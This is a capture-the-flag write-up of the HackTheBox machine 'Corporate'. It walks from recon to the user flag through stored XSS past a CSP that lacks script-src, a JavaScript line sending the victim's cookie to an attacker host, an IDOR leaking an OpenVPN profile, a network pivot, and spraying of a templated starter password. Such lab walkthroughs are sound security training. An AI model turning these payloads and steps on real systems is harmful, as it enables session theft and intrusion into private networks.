---
title: "Corporate"
date: 2027-01-16 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, insane, xss, csp-bypass, idor, openvpn, pivoting, sso, jwt, default-credentials]
description: "Corporate is an Insane Linux box fronted by a corporate single-sign-on portal. A stored XSS in the support chat, combined with a Content-Security-Policy that never set script-src, lets us steal a staff member's signed SSO cookie. An insecure-direct-object-reference on the file-sharing page then leaks a personal OpenVPN profile, opening a route into the internal corporate network — where a guessable templated onboarding password gives SSH and the user flag. This post covers recon through the user flag."
image:
    path: /assets/Images/corporate-006_foothold_vpn-pivot.png
---

## Overview

Corporate is an Insane-difficulty Linux machine built around a corporate single-sign-on (SSO) ecosystem: a support portal, a people directory, a file-sharing app, and a Git server, all sharing one cookie-based identity. The path to user weaves three web flaws together — a stored cross-site-scripting bug in the support chat, a Content-Security-Policy with no `script-src`, and an insecure-direct-object-reference (IDOR) file download — to steal a staff cookie and pull down an OpenVPN profile. That profile drops us onto the internal network, where every new hire shares a predictable starter password. This post stops at `user.txt`.

## Recon

The external attack surface is small — a single web service on port 80 (OpenResty / nginx) that vhosts the whole corporate ecosystem.

```bash
nmap -sC -sV 10.129.229.168
```

Everything is served through subdomains of `corporate.htb`:

| Vhost | Purpose |
|-------|---------|
| `corporate.htb` | landing / SSO front |
| `sso.corporate.htb` | single-sign-on (login, password reset) |
| `support.corporate.htb` | live support chat (socket.io) |
| `people.corporate.htb` | employee directory + file sharing |
| `git.corporate.htb` | Gitea |

Add the vhosts to `/etc/hosts` and start with the support chat, which accepts anonymous tickets.

## Enumeration

### Support chat — stored XSS

Opening a ticket on `support.corporate.htb` creates a socket.io room a staff "agent" bot joins. Messages are rendered into the agent's page with `innerHTML`, so HTML in a message executes in the agent's browser. The site ships a CSP — but it never defines a `script-src` directive, so script execution is not actually restricted.

The trick is to bounce off a reflected sink: an `analytics.min.js` file reflects its `?v=` query parameter straight into the served JavaScript. Injecting a `<meta http-equiv="refresh">` that navigates the agent to a crafted `?v=` payload runs our JavaScript in the corporate origin, where we exfiltrate the agent's cookie:

```javascript
window.location = "http://<lhost>:8888/?" + document.cookie
```

The captured `CorporateSSO` cookie is a valid, currently-signed staff session.

### People directory — IDOR to an OpenVPN profile

With the stolen staff cookie, `people.corporate.htb/sharing` lists shared files and serves them by sequential ID (`/sharing/file/<n>`) with no ownership check — a textbook IDOR. Walking the IDs turns up a personal OpenVPN profile (`nora-brekke.ovpn`).

![vpn-pivot](/assets/Images/corporate-006_foothold_vpn-pivot.png)

## Foothold

### Pivot onto the internal network

The `.ovpn` profile is the only route to the internal `10.9.0.0/24` network (a workstation at `10.9.0.4` and a gateway at `10.9.0.1`). Point its `remote` at the box and bring the tunnel up:

```bash
sudo openvpn --config nora-brekke.ovpn --daemon --log /tmp/vpn.log
ip a | grep -E 'tun|10\.9\.0'
```

Internal SSH is now reachable:

```bash
nc -zv 10.9.0.4 22   # workstation
nc -zv 10.9.0.1 22   # gateway
```

### Sprayed onboarding password

The SSO onboarding flow assigns every new employee a templated starter password of the form `CorporateStarter<DDMMYYYY>`, where the suffix is the user's date of birth (readable from the people directory). Spraying that template against the SSO accounts yields a working login for `elwin.jones`, who has an SSH account on the workstation:

```bash
sshpass -p 'CorporateStarter<DDMMYYYY>' ssh elwin.jones@10.9.0.4
id   # uid=5021(elwin.jones) ... groups=...503(it)
```

## User flag

```bash
cat /home/guests/elwin.jones/user.txt   # HTB{...}
```

![user-flag](/assets/Images/corporate-001_foothold_user-flag.png)

Shell as `elwin.jones` on the internal workstation — user flag captured.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
